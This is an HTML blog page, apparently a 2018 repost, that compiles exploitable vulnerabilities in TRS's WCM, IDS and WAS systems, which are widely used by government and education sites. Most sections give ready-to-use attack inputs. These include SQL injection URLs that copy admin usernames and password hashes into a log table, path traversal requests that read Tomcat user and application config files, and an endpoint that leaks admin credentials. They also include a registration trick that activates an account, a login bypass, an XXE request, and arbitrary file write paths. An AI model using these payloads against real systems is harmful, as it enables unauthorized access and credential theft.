@@ -1,0 +1,372 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+	<meta charset="utf-8">
+	<title>TRS漏洞整理 （转发） - Pa55w0rd的博客</title>
+	<meta name="description" content="TRS北京拓尔思信息技术股份有限公司，其业务系统主要应用于政府、教育、企业等领域，漏洞较多系统有WCM（内容管理系统）、WAS（文本检索系统）、IDS（身份管理系统）。好多客户用到这个，记录一下">
+	<meta http-equiv="X-UA-Compatible" content="IE=edge">
+	<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+	<meta property="og:image" content="">
+	<link rel="shortcut icon" href="/assets/img/favicon/favicon.ico" type="image/x-icon">
+	<link rel="apple-touch-icon" href="/assets/img/favicon/apple-touch-icon.png">
+	<link rel="apple-touch-icon" sizes="72x72" href="/assets/img/favicon/apple-touch-icon-72x72.png">
+	<link rel="apple-touch-icon" sizes="114x114" href="/assets/img/favicon/apple-touch-icon-114x114.png">
+	<!-- Chrome, Firefox OS and Opera -->
+	<meta name="theme-color" content="#2d2a2a">
+	<!-- Windows Phone -->
+	<meta name="msapplication-navbutton-color" content="#2d2a2a">
+	<!-- iOS Safari -->
+	<meta name="apple-mobile-web-app-status-bar-style" content="#2d2a2a">
+
+	<link href="https://fonts.googleapis.com/css?family=Finger+Paint|PT+Sans:400,700" rel="stylesheet">
+	<link rel="stylesheet" href="/assets/fonts/font-awesome/css/font-awesome.min.css">
+	<link rel="stylesheet" href="/assets/css/main.css">
+</head>
+
+<body>
+
+  <aside class="sidebar">
+
+  <div class="sidebar-container">
+    <div class="sidebar-logo">
+      <a href="/" class="logo">Pa55w0rd</a>
+    </div>
+
+    <menu class="sidebar-menu">
+      <li class="menu-items"><a class="menu-links" href="/">主页</a></li>
+      <li class="menu-items"><a class="menu-links" href="/list/">目录</a></li>
+      <li class="menu-items"><a class="menu-links" href="/about/">关于我</a></li>
+      <li class="menu-items"><a class="menu-links" href="https://github.com/Pa55w0rd/">Github 项目</a></li>
+    </menu>
+
+    <div class="sidebar-social">
+ <!--     <li class="social-items"><a href="https://www.facebook.com/" class="social-links"><i class="social-icons fa fa-facebook" aria-hidden="true"></i></a></li>
+      <li class="social-items"><a href="https://twitter.com/" class="social-links"><i class="social-icons fa fa-twitter" aria-hidden="true"></i></a></li>
+      <li class="social-items"><a href="https://plus.google.com/" class="social-links"><i class="social-icons fa fa-google-plus" aria-hidden="true"></i></a></li>
+      <li class="social-items"><a href="https://github.com/https://github.com/Pa55w0rd" class="social-links"><i class="social-icons fa fa-github" aria-hidden="true"></i></a></li>
+-->
+		      <div>Copyright © 2018 www.pa55w0rd.club All Rights Reserved </div>
+	  <div>Email：pa55w0rd@aliyun.com </div>
+	</div>
+
+  </div>
+  <!-- Global site tag (gtag.js) - Google Analytics -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=UA-126660308-1"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'UA-126660308-1');
+</script>
+
+</aside>
+
+
+  <main role="main">
+    <div class="content">
+      <article class="page-article">
+  <div class="wrap-content">
+    <header class="page-header">
+      <h1 class="page-title">TRS漏洞整理 （转发）</h1>
+      <div class="page-date"><span>2018, Oct 19&nbsp;&nbsp;&nbsp;&nbsp;</span></div>
+    </header>
+    <div class="page-content">
+      
+      <blockquote>
+  <p>转自 <a href="https://chmod.cf/2017/06/22/TRS%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/">https://chmod.cf/2017/06/22/TRS%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/</a></p>
+</blockquote>
+
+<ul id="markdown-toc">
+  <li><a href="#0x00-前言" id="markdown-toc-0x00-前言">0x00 <a href="前言">前言</a></a></li>
+  <li><a href="#0x01-wcm内容管理系统" id="markdown-toc-0x01-wcm内容管理系统">0x01 <a href="WCM内容管理系统">WCM内容管理系统</a></a>    <ul>
+      <li><a href="#11-wcm52wcm65存在sql注入" id="markdown-toc-11-wcm52wcm65存在sql注入">1.1 <a href="WCM5.2~WCM6.5存在SQL注入">WCM5.2~WCM6.5存在SQL注入</a></a></li>
+      <li><a href="#12-wcm任意文件下载漏洞" id="markdown-toc-12-wcm任意文件下载漏洞">1.2 <a href="WCM任意文件下载漏洞">WCM任意文件下载漏洞</a></a></li>
+      <li><a href="#13-wcm6x系列用户密码泄漏" id="markdown-toc-13-wcm6x系列用户密码泄漏">1.3 <a href="WCM6.x系列用户密码泄漏">WCM6.x系列用户密码泄漏</a></a></li>
+      <li><a href="#14-wcm用户注册逻辑漏洞" id="markdown-toc-14-wcm用户注册逻辑漏洞">1.4 <a href="WCM用户注册逻辑漏洞">WCM用户注册逻辑漏洞</a></a></li>
+      <li><a href="#15-wcm6权限绕过" id="markdown-toc-15-wcm6权限绕过">1.5 <a href="WCM6权限绕过">WCM6权限绕过</a></a></li>
+      <li><a href="#16-wcm全版本任意文件写入漏洞" id="markdown-toc-16-wcm全版本任意文件写入漏洞">1.6 <a href="WCM全版本任意文件写入漏洞">WCM全版本任意文件写入漏洞</a></a></li>
+    </ul>
+  </li>
+  <li><a href="#0x02-ids身份管理系统" id="markdown-toc-0x02-ids身份管理系统">0x02 <a href="IDS身份管理系统">IDS身份管理系统</a></a>    <ul>
+      <li><a href="#21-ids系统任意文件读取和信息泄露漏洞" id="markdown-toc-21-ids系统任意文件读取和信息泄露漏洞">2.1 <a href="IDS系统任意文件读取和信息泄露漏洞">IDS系统任意文件读取和信息泄露漏洞</a></a></li>
+      <li><a href="#22-xxe漏洞" id="markdown-toc-22-xxe漏洞">2.2 <a href="XXE漏洞">XXE漏洞</a></a></li>
+    </ul>
+  </li>
+  <li><a href="#0x03-was文本检索系统" id="markdown-toc-0x03-was文本检索系统">0x03 <a href="WAS文本检索系统">WAS文本检索系统</a></a>    <ul>
+      <li><a href="#31-was未授权访问" id="markdown-toc-31-was未授权访问">3.1 <a href="WAS未授权访问">WAS未授权访问</a></a></li>
+      <li><a href="#32-未授权发布信息" id="markdown-toc-32-未授权发布信息">3.2 <a href="未授权发布信息">未授权发布信息</a></a></li>
+    </ul>
+  </li>
+  <li><a href="#0x04-was任意文件读取" id="markdown-toc-0x04-was任意文件读取">0x04 <a href="WAS任意文件读取">WAS任意文件读取</a></a></li>
+  <li><a href="#0x05-was任意文件下载漏洞" id="markdown-toc-0x05-was任意文件下载漏洞">0x05 <a href="WAS任意文件下载漏洞">WAS任意文件下载漏洞</a></a></li>
+  <li><a href="#0x06-was任意文件写入" id="markdown-toc-0x06-was任意文件写入">0x06 <a href="WAS任意文件写入">WAS任意文件写入</a></a></li>
+</ul>
+
+<h2 id="0x00-前言">0x00 <a href="前言">前言</a></h2>
+
+<p>TRS北京拓尔思信息技术股份有限公司，其业务系统主要应用于政府、教育、企业等领域，漏洞较多系统有WCM（内容管理系统）、WAS（文本检索系统）、IDS（身份管理系统）。好多客户用到这个，记录一下</p>
+
+<h2 id="0x01-wcm内容管理系统">0x01 <a href="WCM内容管理系统">WCM内容管理系统</a></h2>
+
+<h3 id="11-wcm52wcm65存在sql注入">1.1 <a href="WCM5.2~WCM6.5存在SQL注入">WCM5.2~WCM6.5存在SQL注入</a></h3>
+
+<p>首先是这个页面，<a href="http://xx.xx.xx/portal/db/dbupdatelog_list.jsp">http://xx.xx.xx/portal/db/dbupdatelog_list.jsp</a></p>
+
+<p>直接注入</p>
+
+<div class="highlighter-rouge"><pre class="highlight"><code>http://agent.trs.cn/portal/db/db ... &amp;OrderType=desc;/**/update/**/WCMDBUPDATELOG/**/set/**/LogTitle=%28select/**/top/**/1/**/UserName%2bPassWord/**/from/**/WCMUSER%29/**/where/**/1=1--&amp;OrderField=TableName&amp;SearchKey=CrTime&amp;PageItemCount=15&amp;SearchTable=WCMDBUPDATELOG
+
+http://agent.trs.cn/portal/db/db ... &amp;OrderType=desc;/**/update/**/WCMDBUPDATELOG/**/set/**/LogTitle=%28select/**/top/**/1/**/UserName%2bPassWord/**/from/**/WCMUSER%29/**/where/**/1=1--&amp;OrderField=TableName&amp;SearchKey=CrTime&amp;PageItemCount=15&amp;SearchTable=WCMDBUPDATELOG
+</code></pre>
+</div>
+
+<p>注：存在注入参数为:<code class="highlighter-rouge">OrderType</code>和<code class="highlighter-rouge">OrderField</code></p>
+
+<h3 id="12-wcm任意文件下载漏洞">1.2 <a href="WCM任意文件下载漏洞">WCM任意文件下载漏洞</a></h3>
+
+<p>漏洞存在于<code class="highlighter-rouge">wcm/app/system/read_image.jsp</code>读取上传图片功能处，可构造链接下载任意文件，列如</p>
+
+<div class="highlighter-rouge"><pre class="highlight"><code>http://xx.xx.xx/wcm/app/system/read_image.jsp?Filename=../../../tomcat/conf/tomcat-users.xml
+</code></pre>
+</div>
+
+<p>读取<code class="highlighter-rouge">tomcat</code>配置文件</p>
+
+<h3 id="13-wcm6x系列用户密码泄漏">1.3 <a href="WCM6.x系列用户密码泄漏">WCM6.x系列用户密码泄漏</a></h3>
+
+<p>TRS WCM 6.0以上版本某个功能页面调用<code class="highlighter-rouge">service</code>限制不严格，可以获取后台管理用户的用户名和密码序列。</p>
+
+<p>访问链接：</p>
+
+<div class="highlighter-rouge"><pre class="highlight"><code>HTTP://xx.xx.xx/wcm/infoview.do?serviceid=wcm6_user&amp;MethodName=getOnlineUsers
+</code></pre>
+</div>
+
+<p>WCM的密码加密方式是：常规<code class="highlighter-rouge">32</code>位<code class="highlighter-rouge">MD5</code>取前<code class="highlighter-rouge">15</code>位;</p>
+
+<p>如果只访问<code class="highlighter-rouge">wcm/infoview.do</code>，尽管是个错误页面，比如：</p>
+
+<p>首先访问</p>
+
+<div class="highlighter-rouge"><pre class="highlight"><code>http://xx.xx.xx/wcm/infoview.do
+</code></pre>
+</div>
+
+<p>然后你再访问：</p>
+
+<div class="highlighter-rouge"><pre class="highlight"><code>http://xx.xx.xx/wcm
+</code></pre>
+</div>
+
+<h3 id="14-wcm用户注册逻辑漏洞">1.4 <a href="WCM用户注册逻辑漏洞">WCM用户注册逻辑漏洞</a></h3>
+
+<p>问题出在<code class="highlighter-rouge">wcm/console/auth/reg_newuser.jsp</code>文件中</p>
+
+<p>即将随意表单改成<code class="highlighter-rouge">STATUS</code>值为<code class="highlighter-rouge">30</code>，或增加<code class="highlighter-rouge">STATUS</code>字段表单。</p>
+
+<p>然后提交注册</p>
+
+<p>虽然说是“请等待开通！”，但实际上已经开通了，因为<code class="highlighter-rouge">STATUS</code>字段已经改成正常了。</p>
+
+<p>直接登陆</p>
+
+<p>虽然没什么权限，但后台存在大量注入等漏洞</p>
+
+<p>可以通过注入直接操作数据库了。</p>
+
+<div class="highlighter-rouge"><pre class="highlight"><code>http://localhost:9999/wcm/file/read_file.jsp?FileName=U020120628383491551127/../../../../../Tomcat/webapps/wcm/WEB-INF/classes/trsconfig/domain/config.xml&amp;sDownName=xx
+</code></pre>
+</div>
+
+<h3 id="15-wcm6权限绕过">1.5 <a href="WCM6权限绕过">WCM6权限绕过</a></h3>
+
+<p>首先访问wcm目录，会自动跳转到登录页面</p>
+
+<p>在网址后加上查看管理员密码的链接：</p>
+
+<div class="highlighter-rouge"><pre class="highlight"><code>wcm/infoview.do?serviceid=wcm6_user&amp;MethodName=getUsersByNames&amp;UserNames=admin
+</code></pre>
+</div>
+
+<p>之前的漏洞说查看管理员信息的危害不大是因为<code class="highlighter-rouge">MD5</code>加密只取半截，并且即使破解还有可能遇到<code class="highlighter-rouge">admin</code>账号未启用的问题</p>
+
+<p>这时我们点击浏览器的后退按钮或在地址栏的网址后面直接输入<code class="highlighter-rouge">wcm/app/login.jsp</code>，这样就绕过权限登录了</p>
+
+<h3 id="16-wcm全版本任意文件写入漏洞">1.6 <a href="WCM全版本任意文件写入漏洞">WCM全版本任意文件写入漏洞</a></h3>
+
+<p>这个是16年年初出的漏洞，当初协助北京公司做过一次排查。</p>
+
+<p>是利用<code class="highlighter-rouge">webservices</code>的<code class="highlighter-rouge">importDocuments</code>接口匿名访问，加上畸形文件名进行利用，未找到poc</p>
+
+<h2 id="0x02-ids身份管理系统">0x02 <a href="IDS身份管理系统">IDS身份管理系统</a></h2>
+
+<h3 id="21-ids系统任意文件读取和信息泄露漏洞">2.1 <a href="IDS系统任意文件读取和信息泄露漏洞">IDS系统任意文件读取和信息泄露漏洞</a></h3>
+
+<p>漏洞文件路径在<code class="highlighter-rouge">admin/debug/</code>目录下，读取文件为<code class="highlighter-rouge">fv.jsp</code>，信息泄露为<code class="highlighter-rouge">env.jsp</code>等，直接访问文件即可</p>
+
+<h3 id="22-xxe漏洞">2.2 <a href="XXE漏洞">XXE漏洞</a></h3>
+
+<p>使用<code class="highlighter-rouge">DNS Log</code>进行记录</p>
+
+<div class="highlighter-rouge"><pre class="highlight"><code>POST /ids/service?idsServiceType=jitSyncUser HTTP/1.1
+Host: **.**.**.**
+User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:45.0) Gecko/20100101 Firefox/45.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
+Accept-Encoding: gzip, deflate
+Cookie: trsidsssosessionid=2382B8AE9E8FB5B441212CE2595F963E**.**.**.**
+X-Forwarded-For: **.**.**.**
+Connection: keep-alive
+Content-Type: multipart/form-data; boundary=---------------------------1988224119974
+Content-Length: 196
+]&gt;&amp;xxe;
+</code></pre>
+</div>
+
+<p><a href="https://www.secpulse.com/archives/49564.html">参考资料</a></p>
+
+<h2 id="0x03-was文本检索系统">0x03 <a href="WAS文本检索系统">WAS文本检索系统</a></h2>
+
+<h3 id="31-was未授权访问">3.1 <a href="WAS未授权访问">WAS未授权访问</a></h3>
+
+<p>安装目录下<code class="highlighter-rouge">was40/tree</code>文件可以看到一些后台功能</p>
+
+<p>访问<code class="highlighter-rouge">was40/passwd/passwd.htm</code>输入一个不存在的用户名会暴露出服务器内网IP地址 同时存在暴力破解用户密码的可能性</p>
+
+<h3 id="32-未授权发布信息">3.2 <a href="未授权发布信息">未授权发布信息</a></h3>
+
+<p>编辑信息的时候未对提交的数据进行过滤，同时存在未对用户是否登录进行验证</p>
+
+<h2 id="0x04-was任意文件读取">0x04 <a href="WAS任意文件读取">WAS任意文件读取</a></h2>
+
+<p>问题出在<code class="highlighter-rouge">/was5/web/tree</code>文件下，构造路径可以任意读取文件，这个就创宇提的那个漏洞</p>
+
+<div class="highlighter-rouge"><pre class="highlight"><code>http://xx.xx.xx/was5/web/tree?treefile=/WEB-INF/classes/com/trs/was/resource/wasconfig.properties    
+</code></pre>
+</div>
+
+<h2 id="0x05-was任意文件下载漏洞">0x05 <a href="WAS任意文件下载漏洞">WAS任意文件下载漏洞</a></h2>
+
+<p>问题出在<code class="highlighter-rouge">was5/admin/template/download_templet.jsp</code>文件下，构造<code class="highlighter-rouge">type</code>参数的值可以任意下载文件，</p>
+
+<div class="highlighter-rouge"><pre class="highlight"><code>http://xx.xx.xx/was5/admin/template/download_templet.jsp?type=../web/tagscloud    
+</code></pre>
+</div>
+
+<h2 id="0x06-was任意文件写入">0x06 <a href="WAS任意文件写入">WAS任意文件写入</a></h2>
+
+<p>漏洞文件是<code class="highlighter-rouge">was5/admin/template/customize/detailcustomize</code>,构造<code class="highlighter-rouge">template</code>的参数值进行任意文件写入</p>
+
+<p>同理还有一个问题文件<code class="highlighter-rouge">/was5/admin/template/customize/outlinecustomize</code>，利用方式一样</p>
+
+    </div>
+    
+
+	
+	<div class="share-component" data-disabled="" data-description="Share.js - 一键分享到微博，QQ空间，腾讯微博，人人，豆瓣">一键分享</div>
+	
+
+
+	<div id="disqus_thread"></div>
+<script>
+
+/**
+*  RECOMMENDED CONFIGURATION VARIABLES: EDIT AND UNCOMMENT THE SECTION BELOW TO INSERT DYNAMIC VALUES FROM YOUR PLATFORM OR CMS.
+*  LEARN WHY DEFINING THESE VARIABLES IS IMPORTANT: https://disqus.com/admin/universalcode/#configuration-variables*/
+/*
+var disqus_config = function () {
+this.page.url = PAGE_URL;  // Replace PAGE_URL with your page's canonical URL variable
+this.page.identifier = PAGE_IDENTIFIER; // Replace PAGE_IDENTIFIER with your page's unique identifier variable
+};
+*/
+(function() { // DON'T EDIT BELOW THIS LINE
+var d = document, s = d.createElement('script');
+s.src = 'https://pa55w0rd.disqus.com/embed.js';
+s.setAttribute('data-timestamp', +new Date());
+(d.head || d.body).appendChild(s);
+})();
+</script>
+<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+
+<script id="dsq-count-scr" src="//pa55w0rd.disqus.com/count.js" async></script>
+
+
+  </div>
+  
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/social-share.js/1.0.16/css/share.min.css" />
+<script src="https://cdnjs.cloudflare.com/ajax/libs/social-share.js/1.0.16/js/social-share.min.js"></script>
+
+<!--
+<script language=JavaScript>
+
+var caution = false
+function setCookie(name, value, expires, path, domain, secure) {
+var curCookie = name + "=" + escape(value) +
+((expires) ? "; expires=" + expires.toGMTString() : "") +
+((path) ? "; path=" + path : "") +
+((domain) ? "; domain=" + domain : "") +
+((secure) ? "; secure" : "")
+if (!caution || (name + "=" + escape(value)).length <= 4000)
+document.cookie = curCookie
+else
+if (confirm("Cookie exceeds 4KB and will be cut!"))
+document.cookie = curCookie
+}
+function getCookie(name) {
+var prefix = name + "="
+var cookieStartIndex = document.cookie.indexOf(prefix)
+if (cookieStartIndex == -1)
+return null
+var cookieEndIndex = document.cookie.indexOf(";", cookieStartIndex + prefix.length)
+if (cookieEndIndex == -1)
+cookieEndIndex = document.cookie.length
+return unescape(document.cookie.substring(cookieStartIndex + prefix.length, cookieEndIndex))
+}
+function deleteCookie(name, path, domain) {
+if (getCookie(name)) {
+document.cookie = name + "=" +
+((path) ? "; path=" + path : "") +
+((domain) ? "; domain=" + domain : "") +
+"; expires=Thu, 01-Jan-70 00:00:01 GMT"
+}
+}
+function fixDate(date) {
+var base = new Date(0)
+var skew = base.getTime()
+if (skew > 0)
+date.setTime(date.getTime() - skew)
+}
+var now = new Date()
+fixDate(now)
+now.setTime(now.getTime() + 365 * 24 * 60 * 60 * 1000)
+var visits = getCookie("counter")
+if (!visits)
+visits = 1
+else
+visits = parseInt(visits) + 1
+setCookie("counter", visits, now)
+document.write("您是第" + visits + "位访问本篇文章的！")
+
+</script>
+-->
+
+</article>
+
+    </div>
+  </main>
+
+<script>
+  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+  (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+  m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+  })(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
+
+  ga('create', '', 'auto');
+  ga('send', 'pageview');
+</script>
+
+
+
+</body>
+</html>
